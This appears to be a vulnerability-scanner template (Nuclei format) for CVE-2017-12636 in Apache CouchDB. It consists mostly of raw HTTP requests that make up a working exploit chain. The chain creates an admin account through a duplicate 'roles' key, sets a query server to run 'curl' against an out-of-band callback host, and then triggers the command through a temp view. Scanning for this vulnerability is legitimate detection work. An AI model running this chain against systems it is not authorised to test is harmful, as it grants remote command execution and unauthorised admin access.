id: CVE-2017-12636
info:
  author: princechaddha
  description: CouchDB administrative users can configure the database server via
    HTTP(S). Some of the configuration options include paths for operating system-level
    binaries that are subsequently launched by CouchDB. This allows an admin user
    in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell
    commands as the CouchDB user, including downloading and executing scripts from
    the public internet.
  name: Couchdb Arbitrary Command Execution (CVE-2017-12636)
  reference:
  - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636
  - https://nvd.nist.gov/vuln/detail/CVE-2017-12636
  severity: high
  tags: cve,cve2017,couchdb,apache,rce,oast
requests:
- matchers:
  - name: http
    part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - "PUT /_users/org.couchdb.user:{{rand_base(5, 'abc')}} HTTP/1.1\nHost:  {{Hostname}}\n\
    Accept: application/json\n\n{\n  \"type\": \"user\",\n  \"name\": \"{{rand_base(5,\
    \ 'abc')}}\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"\
    {{randstr}}\"\n}\n"
  - 'PUT /_config/query_servers/cmd HTTP/1.1

    Host: {{Hostname}}

    Authorization: {{base64("{{rand_base(5, ''abc'')}}"+:+"{{randstr}}")}}


    "curl {{interactsh-url}}"

    '
  - 'PUT /testpoc HTTP/1.1

    Host: {{Hostname}}

    Authorization: {{base64("{{rand_base(5, ''abc'')}}"+:+"{{randstr}}")}}

    '
  - 'PUT /testpoc/vul HTTP/1.1

    Host: {{Hostname}}

    Authorization: {{base64("{{rand_base(5, ''abc'')}}"+:+"{{randstr}}")}}


    {"_id": "770895a97726d5ca6d70a22173005c7b"}

    '
  - 'POST /testpoc/_temp_view?limit=10 HTTP/1.1

    Host: {{Hostname}}

    Authorization: {{base64("{{rand_base(5, ''abc'')}}"+:+"{{randstr}}")}}

    Content-Type: application/json


    {"language": "cmd", "map":""}

    '
